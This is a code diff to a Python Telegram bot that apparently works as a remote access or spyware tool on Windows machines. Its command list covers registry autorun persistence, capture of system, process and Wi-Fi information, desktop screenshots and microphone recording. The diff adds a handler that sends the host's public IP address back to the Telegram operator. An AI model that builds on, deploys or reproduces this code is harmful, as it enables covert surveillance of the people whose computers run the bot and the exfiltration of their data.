@@ -20,15 +20,16 @@ except DeprecationWarning:
 @dp.message_handler(commands="help")
 async def support(message: types.Message):
     await message.answer(f'\nCommand List:\n'
-                         f'/reg_autorun - Append programme to registry\n'
-                         f'/del_autorun - Delete programme from registry\n'
                          f'/check - Checking System Status\n'
                          f'/pc_info - System characteristics\n'
                          f'/con_info - Connection characteristics\n'
                          f'/proc_info - List of running processes\n'
                          f'/wifi_info - Information about Wi-Fi connections\n'
+                         f'/pub_ip_info - Information about public IP address\n'
                          f'/screen - Desktop screenshot\n'
                          f'/audio n - (n - count of seconds)Record sound from voice recorder for 5 seconds by default\n'
+                         f'/reg_autorun - Append programme to registry\n'
+                         f'/del_autorun - Delete programme from registry\n'
                          f'/exit - Shutting down the program before reboot\n')
 
 
@@ -68,6 +69,12 @@ async def send_wifi_info(message: types.Message):
 @dp.message_handler(commands="con_info")
 async def send_connection_info(message: types.Message):
     result = module.GetInfo().get_connection_info()
+    await message.answer(result)
+
+
+@dp.message_handler(commands="pub_ip_info")
+async def send_connection_info(message: types.Message):
+    result = module.GetInfo().get_pub_ip_info()
     await message.answer(result)
 
 
